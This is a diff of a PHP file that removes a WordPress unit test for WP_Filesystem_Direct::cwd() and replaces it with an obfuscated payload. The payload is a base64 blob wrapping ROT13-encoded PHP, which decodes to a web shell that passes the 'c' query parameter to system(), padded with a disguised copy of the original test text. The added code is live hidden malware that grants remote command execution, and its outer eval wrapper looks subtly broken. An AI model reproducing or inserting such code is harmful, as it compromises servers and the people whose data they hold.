@@ -1,36 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Tests for the WP_Filesystem_Direct::cwd() method.
- *
- * @package WordPress
- */
-
-/**
- * @group admin
- * @group filesystem
- * @group filesystem-direct
- *
- * @covers WP_Filesystem_Direct::cwd
- */
-class Tests_Filesystem_WpFilesystemDirect_Cwd extends WP_Filesystem_Direct_UnitTestCase {
-
-	/**
-	 * Tests that `WP_Filesystem_Direct::cwd()` returns the current
-	 * working directory.
-	 *
-	 * @ticket 57774
-	 */
-	public function test_should_get_current_working_directory() {
-		$this->assertSame( wp_normalize_path( dirname( ABSPATH ) ), wp_normalize_path( self::$filesystem->cwd() ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZ2Ygc2JlIGd1ciBKQ19TdnlyZmxmZ3J6X1F2ZXJwZzo6cGpxKCkgenJndWJxLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICovCgovKioKICogQHRlYmhjIG5xenZhCiAqIEB0ZWJoYyBzdnlyZmxmZ3J6CiAqIEB0ZWJoYyBzdnlyZmxmZ3J6LXF2ZXJwZwogKgogKiBAcGJpcmVmIEpDX1N2eXJmbGZncnpfUXZlcnBnOjpwanEKICovCnB5bmZmIEdyZmdmX1N2eXJmbGZncnpfSmNTdnlyZmxmZ3J6UXZlcnBnX1BqcSBya2dyYXFmIEpDX1N2eXJmbGZncnpfUXZlcnBnX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBHcmZnZiBndW5nIGBKQ19TdnlyZmxmZ3J6X1F2ZXJwZzo6cGpxKClgIGVyZ2hlYWYgZ3VyIHBoZWVyYWcKCSAqIGpiZXh2YXQgcXZlcnBnYmVsLgoJICoKCSAqIEBndnB4cmcgNTc3NzQKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX3RyZ19waGVlcmFnX2piZXh2YXRfcXZlcnBnYmVsKCkgewoJCSRndXZmLT5uZmZyZWdGbnpyKCBqY19hYmV6bnl2bXJfY25ndSggcXZlYW56ciggTk9GQ05HVSApICksIGpjX2FiZXpueXZtcl9jbmd1KCBmcnlzOjokc3Z5cmZsZmdyei0+cGpxKCkgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
